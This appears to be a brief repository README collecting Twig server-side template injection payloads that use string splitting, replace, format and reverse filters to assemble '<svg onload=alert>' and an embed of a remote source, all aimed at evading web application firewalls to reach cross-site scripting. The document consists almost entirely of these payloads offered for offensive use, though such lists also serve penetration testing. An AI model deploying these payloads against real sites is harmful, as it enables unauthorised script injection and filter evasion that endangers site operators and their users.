#### SSTItoXSS
Exploiting SSTI to bypass WAF

This repository aimed at bypassing WAF with server side template injection, for the times when RCE isn't possible.

- twig

```
{%set a="<svg oYad=aZt`1`>"%}
{{a|replace({'Y':'nlo','Z':'ler'})|raw}}

{%set a='<svg o'%}
{%set b='nload=al'%}
{%set c='ert`1`>'%}
{{a|raw}}{{b|raw}}{{c|raw}}

{{'<svg o'}}{{'nload=al'}}{{'ert`1`>'}}

{{'<sv%snload=%s%s>'|format('g o','aler','t`1`')|raw}}

{{'>)1(trela=daolno gvs<'|reverse|raw}}

{{'<embe'}}{{'d src=//14.rs>'}}
```

#### TODO

1. Categorise
